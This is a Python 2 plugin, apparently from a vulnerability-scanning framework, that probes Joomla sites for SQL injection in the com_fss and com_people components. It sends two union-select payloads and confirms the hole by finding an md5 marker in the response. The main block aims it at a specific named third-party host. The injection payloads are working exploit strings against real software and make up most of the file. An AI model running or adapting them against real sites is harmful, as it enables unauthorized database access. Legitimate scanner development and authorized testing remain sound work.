from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
#__Author__ = luca
#__Service_ = joomla
#__Refer___ = 
#___Type___ = sqli
"""


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payloads = (
             "index.php?option=com_fss&view=test&prodid=777777.7%27+union+all+select+77777777777777%2C77777777777777%2C77777777777777%2Cmd5(3.1415)%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777--+D4NB4R%22",
             "index.php?option=com_people&controller=people&task=details&id=-1 UNION SELECT md5(3.1415),2,3"
             )
        for payload in payloads:
            url = arg + payload
            code, head, res, errcode, _ = curl.curl('"%s"' % url)
            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
                output(url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_4141413dd98bf6b83a0ef89121e21e8e.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_4141413dd98bf6b83a0ef89121e21e8e.py
#/root/github/poccreate/codesrc/exp-555.py